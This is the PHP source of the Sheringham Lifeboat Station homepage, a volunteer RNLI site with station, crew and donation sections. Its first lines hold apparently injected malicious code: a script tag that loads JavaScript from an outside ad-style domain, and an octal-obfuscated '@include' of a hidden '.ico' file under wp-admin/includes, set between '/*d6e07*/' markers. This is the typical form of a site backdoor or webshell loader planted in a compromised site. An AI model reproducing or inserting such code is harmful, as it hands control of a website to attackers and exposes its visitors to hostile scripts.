<script type='text/javascript' src='https://snippet.adsformarket.com/same.js'></script><?php
/*d6e07*/

@include "\057ho\155e/\163he\162in\147h/\160ub\154ic\137ht\155l/\167p-\141dm\151n/\151nc\154ud\145s/\05643\067e0\061f7\056ic\157";

/*d6e07*/ 

?> 
<!DOCTYPE html>
<html lang="en-US">

<head>

	<?php include("includes/scripts/application.php");

		$page = pagevar();
		$subpage = pagevar();
		$pagekw = "Sheringham Lifeboat";
		include("site_specific/defines.php");

	?>

<title>Sheringham Lifeboat</title>

	<meta charset="UTF-8">

	<meta name="viewport" content="width=device-width">
    
	<meta name="description" content="Sheringham Lifeboat Station is run entirely by volunteers committed to saving lives at sea. This website aims to provide an insight to the men and equipment that have made, and continue to make, Sheringham Lifeboat Station a success since 1838." />
	<meta name="keywords" content="sheringham, rnli, lifeboat, lifeboat station" />

	<?php
	 	include("includes/meta-tags/default/general.php");
		include("includes/head/stylesheets.php");
		include("includes/head/head-scripts.php");
		include("includes/head/analytics.php");
	?>
	
</head>

<body id="<?php echo $page; ?>" class="<?php echo $subpage; ?>">

<?php include ("includes/content/header.php"); ?>

<div class="mainrunner">

	<div class="mainrunnercontainer">
		
		<h1 class="introtext">Sheringham Lifeboat Station</h1>
		<p class="tagline">Saving life at sea.</p>
		<p class="introtext">Sheringham Lifeboat Station is run entirely by volunteers committed to saving lives at sea.  This website aims to provide an insight to the men and equipment that have made, and continue to make, Sheringham Lifeboat Station a success since 1838.</p>
		<a class="readmore" href="station.php">Read about the station &raquo;</a>

	</div>

</div>

<div class="outerContainer">

	<ul class="buckets">

		<li class="station"><a href="station.php"><span>The</span> Station</a></li>
		<li class="lifeboat"><a href="lifeboat.php"><span>The</span> Lifeboat</a></li>
		<li class="crew"><a href="crew.php"><span>The</span> Crew</a></li>
		<li class="tractor"><a href="tractor.php"><span>The</span> Tractor</a></li>

	</ul>

</div>

<div class="outerContainer">

	<div class="container">

		<div class="latest-tweets">

			<a class="twitter-timeline" href="https://twitter.com/SheringhamRNLI" data-tweet-limit="2" data-widget-id="334407315807682561">Tweets by @SheringhamRNLI</a>
			<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>

		</div>

		<div class="right-columns">

			<div class="col">

				<?php include ("includes/content/cta-donate.php"); ?>

			</div>

			<div class="col">

				<?php include ("includes/content/cta-events.php"); ?>

			</div>

		</div>

	</div>

</div>

<?php include ("includes/content/footer.php"); ?>

<?php include("includes/head/scripts.php"); ?>

</body>

</html>